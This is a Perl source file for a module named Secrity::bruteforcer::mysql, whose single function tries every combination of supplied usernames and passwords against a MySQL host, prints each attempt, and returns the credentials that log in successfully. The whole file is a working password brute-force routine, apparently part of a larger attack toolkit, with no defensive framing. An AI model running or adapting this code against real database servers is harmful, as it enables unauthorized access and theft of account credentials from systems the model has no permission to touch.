package Secrity::bruteforcer::mysql;
use Secrity::bruteforcer::BMYSQL;
use strict;
use warnings;

our $VERSION = '0.01';
my $DEBUG = 0;

our @ISA    = qw(Exporter);
our @EXPORT = qw(mysql);
sub mysql {

    my ($host,$user) = @_;
    my $result;
    print "$host \n";
    my (@usrs,@pws);
    push @usrs,$_  for(@{$user->{user}});
    push @pws,$_  for(@{$user->{pass}});
    for (@usrs) {
        my $user = $_;
        for (@pws) {
            my $pwd = $_;
            $pwd =~ s/\{user\}/$user/g if /\{user\}/;
            print "$user,$pwd \n";
            my $bmysql = BMYSQL->new(
                hostname => $host,
                debug    => $DEBUG,
            ) or return;

            $bmysql->login( $user, $pwd );
            if ( $bmysql->get_succect ) {
                if ($DEBUG) {
                    print "succect!\n";
                    print $_ , " => ", $bmysql->{$_}, "\n"
                      for ( keys %{$bmysql} );
                }
                $result .=
                  $bmysql->{'user'} . " " . $bmysql->{'password'} . "\n";
                last;
            }
        }
    }
    return $result;
}
